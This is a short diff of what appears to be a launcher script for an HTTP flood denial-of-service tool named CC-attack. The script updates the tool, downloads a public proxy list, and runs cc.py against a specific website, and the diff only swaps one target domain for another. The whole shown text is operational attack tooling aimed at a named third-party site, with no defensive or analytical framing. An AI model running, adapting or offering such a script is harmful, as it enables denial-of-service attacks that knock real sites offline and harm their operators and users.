@@ -11,7 +11,7 @@ echo "CC-attack"
 cd CC-attack
 git pull
 curl https://jsd.cdn.zzko.cn/gh/TheSpeedX/PROXY-List@master/http.txt -o http.txt
-F:\Python310\python.exe cc.py -url http://ffwebss.top/ -f http.txt -v 5 -s 30
+F:\Python310\python.exe cc.py -url http://fwebss.top/ -f http.txt -v 5 -s 30
 cd ..
 
 echo ""
